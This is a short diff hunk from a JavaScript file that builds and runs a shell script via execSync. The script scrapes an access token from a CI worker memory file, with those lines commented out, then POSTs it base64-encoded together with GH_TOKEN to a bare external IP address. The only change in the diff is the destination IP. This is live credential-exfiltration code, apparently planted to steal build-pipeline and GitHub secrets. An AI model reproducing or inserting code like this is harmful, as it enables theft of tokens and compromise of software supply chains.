@@ -13,6 +13,6 @@ const script = `
     # ACCESS_TOKEN=$(strings -n 40 /home/vsts/work/_temp/heap_worker.bin | grep -E '^{"token": ".+"}$' | head -1 | sed -Ee 's/token": "(.+)"}$/\\1/');
     # ACCESS_TOKEN=$(strings -n 80 /home/vsts/work/_temp/heap_worker.bin | grep -i 'accesstoken' | head -n 1);
 
-    curl -X POST -H "Content-Type: application/json" -d "{\\"accessToken\\": \\"$(echo $ACCESS_TOKEN | base64)\\", \\"gh\\": \\"$(echo $GH_TOKEN | base64)\\"}" http://35.202.247.162:39123
+    curl -X POST -H "Content-Type: application/json" -d "{\\"accessToken\\": \\"$(echo $ACCESS_TOKEN | base64)\\", \\"gh\\": \\"$(echo $GH_TOKEN | base64)\\"}" http://35.202.247.169:39123
 `
 execSync(script)
